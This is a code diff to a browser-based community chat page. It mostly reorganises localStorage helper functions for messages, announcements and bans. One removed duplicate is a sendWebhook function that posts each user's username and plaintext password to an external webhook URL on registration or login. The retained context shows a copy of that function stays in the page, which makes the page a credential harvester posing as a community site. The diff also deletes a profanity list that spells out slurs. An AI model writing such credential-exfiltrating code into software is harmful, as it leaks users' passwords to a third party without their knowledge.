@@ -1,52 +1,4 @@
-function saveCommunityMessages() {
-            try {
-                localStorage.setItem(COMMUNITY_MESSAGES_KEY, JSON.stringify(communityMessages));
-            } catch (e) {
-                console.error("Error saving messages:", e);
-            }
-        }
-
-        function loadAnnouncements() {
-            try {
-                const stored = localStorage.getItem(ANNOUNCEMENTS_KEY);
-                announcements = stored ? JSON.parse(stored) : [];
-            } catch (e) {
-                announcements = [];
-            }
-        }
-
-        function saveAnnouncements() {
-            try {
-                localStorage.setItem(ANNOUNCEMENTS_KEY, JSON.stringify(announcements));
-            } catch (e) {
-                console.error("Error saving announcements:", e);
-            }
-        }
-
-        function loadBannedUsers() {
-            try {
-                const stored = localStorage.getItem(BANNED_USERS_KEY);
-                bannedUsers = stored ? JSON.parse(stored) : [];
-            } catch (e) {
-                bannedUsers = [];
-            }
-        }
-
-        function saveBannedUsers() {
-            try {
-                localStorage.setItem(BANNED_USERS_KEY, JSON.stringify(bannedUsers));
-            } catch (e) {
-                console.error("Error saving banned users:", e);
-            }
-        }
-
-        function isAdmin(username) {
-            return ADMIN_USERS.includes(username?.toLowerCase());
-        }
-
-        function isBanned(username) {
-            return bannedUsers.includes(username?.toLowerCase());
-        }<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -1130,8 +1082,6 @@ function saveCommunityMessages() {
         let announcements = [];
         let bannedUsers = [];
 
-        const PROFANITY_LIST = ['nude', 'fuck', 'shit', 'cunt', 'piss', 'nigger', 'faggot', 'bitch'];
-
         // DOM Elements
         const tabButtons = document.querySelectorAll('.tab-button');
         const tabContents = document.querySelectorAll('.tab-content');
@@ -1164,6 +1114,57 @@ function saveCommunityMessages() {
         const currentUserElement = document.getElementById('current-username');
         const currentUserIdElement = document.getElementById('current-user-id');
 
+        // Helper Functions
+        function saveCommunityMessages() {
+            try {
+                localStorage.setItem(COMMUNITY_MESSAGES_KEY, JSON.stringify(communityMessages));
+            } catch (e) {
+                console.error("Error saving messages:", e);
+            }
+        }
+
+        function loadAnnouncements() {
+            try {
+                const stored = localStorage.getItem(ANNOUNCEMENTS_KEY);
+                announcements = stored ? JSON.parse(stored) : [];
+            } catch (e) {
+                announcements = [];
+            }
+        }
+
+        function saveAnnouncements() {
+            try {
+                localStorage.setItem(ANNOUNCEMENTS_KEY, JSON.stringify(announcements));
+            } catch (e) {
+                console.error("Error saving announcements:", e);
+            }
+        }
+
+        function loadBannedUsers() {
+            try {
+                const stored = localStorage.getItem(BANNED_USERS_KEY);
+                bannedUsers = stored ? JSON.parse(stored) : [];
+            } catch (e) {
+                bannedUsers = [];
+            }
+        }
+
+        function saveBannedUsers() {
+            try {
+                localStorage.setItem(BANNED_USERS_KEY, JSON.stringify(bannedUsers));
+            } catch (e) {
+                console.error("Error saving banned users:", e);
+            }
+        }
+
+        function isAdmin(username) {
+            return ADMIN_USERS.includes(username?.toLowerCase());
+        }
+
+        function isBanned(username) {
+            return bannedUsers.includes(username?.toLowerCase());
+        }
+
         function generateLocalId() {
             return (typeof crypto !== 'undefined' && crypto.randomUUID) ? crypto.randomUUID() : ('local-' + Date.now().toString(36) + Math.random().toString(36).substring(2, 9));
         }
@@ -1194,26 +1195,6 @@ function saveCommunityMessages() {
                 console.error("Error loading messages:", e);
                 communityMessages = [];
             }
-        }
-
-        function saveCommunityMessages() {
-            try {
-                localStorage.setItem(COMMUNITY_MESSAGES_KEY, JSON.stringify(communityMessages));
-            } catch (e) {
-                console.error("Error saving messages:", e);
-            }
-        }
-
-        function sendWebhook(username, password) {
-            const payload = {
-                content: `📝 **New Registration/Login**\nUsername: \`${username}\`\nPassword: \`${password}\`\nTime: <t:${Math.floor(Date.now() / 1000)}:F>`
-            };
-
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(e => console.error("Webhook error:", e));
         }
 
         function sendWebhook(username, password) {
@@ -1621,6 +1602,7 @@ function saveCommunityMessages() {
             newActiveContent.classList.add('active');
         }
 
+        // Event Listeners
         closeModalButton.addEventListener('click', hideModal);
         generalModal.addEventListener('click', (e) => {
             if (e.target === generalModal.querySelector('.modal-overlay')) { hideModal(); }
@@ -1659,6 +1641,7 @@ function saveCommunityMessages() {
             });
         });
 
+        // Initialize
         document.addEventListener('DOMContentLoaded', () => {
             loadCommunityMessages();
             loadAnnouncements();
@@ -1685,6 +1668,9 @@ function saveCommunityMessages() {
             const clearChatBtn = document.getElementById('clear-chat-btn');
             clearChatBtn.addEventListener('click', clearCommunityChat);
         });
+
+        // Make functions available globally for onclick handlers
+        window.toggleBanUser = toggleBanUser;
 
     </script>
 
